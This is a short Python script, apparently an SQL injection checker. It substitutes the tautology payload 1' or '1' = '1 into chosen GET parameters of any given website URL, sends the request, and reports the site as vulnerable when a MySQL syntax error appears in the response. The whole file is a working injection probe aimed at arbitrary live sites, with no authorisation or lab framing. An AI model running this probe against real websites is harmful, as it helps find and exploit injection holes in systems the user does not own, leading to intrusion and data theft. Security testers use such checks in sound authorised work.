import sys
import urllib
import urllib.request
import re

# this script will check if GET parameters are injectables
#
# py sqli_checker.py [website URI] [parameter to inject...]

""" Replace the attributes that are in to_inject by SQL
"""
def inject_SQL(uri, to_inject):
	first_part, second_part = uri.split('?')
	params = second_part.split('&')
	for i in range(len(params)):
		label, value = params[i].split('=')
		if label in to_inject:
			params[i] = label + "=1'%20or%20'1'%20=%20'1"

	return first_part + '?' + '&'.join(params)

regex_script_param = re.compile(r'^-[a-z]+$')

# required script name and URI at least
if len(sys.argv) < 2:
	sys.exit("[ERROR] You have to pass the URI to test as a parameter !")

# read the uri to test
uri = sys.argv[1]

# read the parameters and options
parameters = []
options = []
for i in range(1, len(sys.argv)):
	arg = sys.argv[i]
	if re.match(regex_script_param, arg):
		options.append(arg)
	else:
		parameters.append(arg)

# make the request
resp = urllib.request.urlopen(inject_SQL(uri, parameters))

# parse response
body = resp.read()
full_body = body.decode('utf-8')

# check vulnerability by looking at the response
if "You have an error in your SQL syntax" in full_body:
	print ("Vulnerable to SQL injection !!")
	print ("MYSQL database")
else:
	print ("Not vulnerable to SQL injection.")
